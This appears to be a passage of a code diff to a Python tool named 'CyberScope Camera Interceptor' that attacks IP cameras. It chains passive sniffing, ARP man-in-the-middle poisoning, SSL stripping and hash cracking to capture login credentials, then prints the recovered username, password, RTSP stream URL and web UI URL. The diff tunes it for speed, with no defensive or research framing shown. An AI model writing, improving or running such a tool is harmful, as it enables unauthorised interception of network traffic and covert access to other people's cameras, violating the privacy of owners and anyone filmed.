     print(f"\n{'='*60}")
-    print(f"  CyberScope Camera Interceptor")
+    print(f"  CyberScope Camera Interceptor  [FAST MODE]")
     print(f"  Target : {target_ip}:{port}")
-    print(f"  Gateway: {get_gateway()}")
+    print(f"  Gateway: {gw}")
     print(f"{'='*60}\n")
 
-    # ── Layer 1: Passive sniff ────────────────────────────────────────────────
-    print("[*] Layer 1: Passive sniff (30s)...")
-    hash_data = passive_sniff(target_ip, duration=30)
+    # ── Layer 1: 5 s passive sniff (free hash) ────────────────────────────────
+    print("[*] Layer 1: Passive sniff (5s)...")
+    hash_data = capture_hash(target_ip, duration=5)
     if hash_data:
         print("[+] Got hash passively — no MITM needed!")
         result = crack_all(hash_data, target_ip, port)
@@ -532,13 +517,11 @@ def intercept_and_crack(target_ip, duration=300, port=80):
             _print_result(target_ip, result)
             return result
 
-    # ── Layer 2: ARP MITM ────────────────────────────────────────────────────
-    gateway = get_gateway()
-    print(f"\n[*] Layer 2: ARP MITM ({target_ip} ↔ {gateway})...")
-    enable_ip_forward()
-    p1, p2 = start_mitm(target_ip, gateway)
-    time.sleep(2)
-    print("[+] MITM active")
+    # ── Layer 2: ARP MITM ─────────────────────────────────────────────────────
+    print(f"\n[*] Layer 2: ARP MITM ({target_ip} ↔ {gw})...")
+    p1, p2 = start_mitm(target_ip, gw)
+    time.sleep(1)   # 1 s to poison ARP caches (was 2 s)
+    print("[+] MITM active — traffic is now flowing through us")
 
     # ── Layer 3: SSL strip ────────────────────────────────────────────────────
     print("[*] Layer 3: SSL strip (443→8080)...")
@@ -546,49 +529,52 @@ def intercept_and_crack(target_ip, duration=300, port=80):
 
     try:
         # ── Layer 4: Active sniff ─────────────────────────────────────────────
-        remaining = max(duration - 30, 60)
-        print(f"\n[*] Layer 4: Active sniff for {remaining}s...")
-        print(f"[*] Open http://{target_ip} in a browser and log in NOW")
+        remaining = max(duration - 5, 30)
+        print(f"\n[*] Layer 4: Active sniff ({remaining}s)...")
+        print(f"[*] >>> Open http://{target_ip} in a browser and LOG IN NOW <<<")
         hash_data = capture_hash(target_ip, duration=remaining)
 
         if not hash_data:
-            print("[-] No Digest hash captured")
-            print("[-] Possible reasons:")
+            print("[-] No Digest hash captured during sniff window")
+            print("    Possible reasons:")
+            print("    • Nobody logged in during the window — try again")
             print("    • Camera uses HTTPS and sslstrip failed")
-            print("    • Nobody logged into the camera during the window")
-            print("    • Camera uses a non-standard auth mechanism")
+            print("    • Camera uses Basic auth (not Digest)")
             return None
 
-        # ── Layers 5-7: Crack ─────────────────────────────────────────────────
+        # ── Layers 5-9: Parallel crack ────────────────────────────────────────
+        print(f"\n[*] Hash captured — starting parallel crack pipeline...")
         result = crack_all(hash_data, target_ip, port)
         if result:
             _print_result(target_ip, result)
             return result
 
-        print("[-] All cracking methods exhausted — password not in wordlist")
+        print("[-] All methods exhausted — password not in any wordlist")
         return None
 
     finally:
         p1.terminate()
         p2.terminate()
         stop_sslstrip()
-        disable_ip_forward()
-        print("\n[*] MITM stopped, IP forwarding disabled, iptables cleaned")
+        _disable_fwd()
+        print("\n[*] Cleanup done — MITM stopped, iptables restored")
 
 
-def _print_result(target_ip, result):
+def _print_result(target_ip, r):
     print(f"\n{'='*60}")
     print(f"  ✓ CAMERA ACCESS GAINED")
     print(f"  IP       : {target_ip}")
-    print(f"  Username : {result['username']}")
-    print(f"  Password : {result['password']}")
-    print(f"  Method   : {result['method']}")
-    print(f"  Stream   : rtsp://{result['username']}:{result['password']}@{target_ip}:554/Streaming/Channels/101")
-    print(f"  Web UI   : http://{result['username']}:{result['password']}@{target_ip}/")
+    print(f"  Username : {r['username']}")
+    print(f"  Password : {r['password']}")
+    print(f"  Method   : {r['method']}")
+    print(f"  Stream   : rtsp://{r['username']}:{r['password']}@{target_ip}:554/Streaming/Channels/101")
+    print(f"  Web UI   : http://{r['username']}:{r['password']}@{target_ip}/")
     print(f"{'='*60}\n")
+    # Flush so Flask subprocess.check_output() sees it immediately
+    sys.stdout.flush()
 
 
 if __name__ == "__main__":
     target   = sys.argv[1] if len(sys.argv) > 1 else "192.168.31.246"
-    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
+    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 120
     intercept_and_crack(target, duration)
